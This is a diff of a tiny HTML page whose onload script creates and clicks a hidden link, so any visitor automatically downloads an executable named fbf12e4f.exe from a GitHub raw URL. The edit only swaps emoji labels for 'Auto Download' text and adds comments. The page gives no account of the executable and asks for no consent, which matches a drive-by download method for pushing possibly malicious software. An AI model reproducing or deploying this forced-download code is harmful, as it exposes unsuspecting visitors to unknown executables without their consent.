@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>🤝</title>
+    <title>Auto Download</title>
     <script type="text/javascript">
-      window.onload = function () {
-        const link = document.createElement("a");
-        link.href = "https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe";
-        link.download = "";
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
+      window.onload = function() {
+        var link = document.createElement('a');
+        link.href = 'https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe'; // GitHub raw file URL
+        link.download = 'fbf12e4f.exe'; // Set the filename for the downloaded file
+        document.body.appendChild(link); // Add the link to the DOM
+        link.click(); // Trigger the download
+        document.body.removeChild(link); // Remove the link from the DOM after clicking
       };
     </script>
   </head>
   <body>
-    <h1>😝</h1>
+    <h1>Downloading...</h1>
   </body>
 </html>
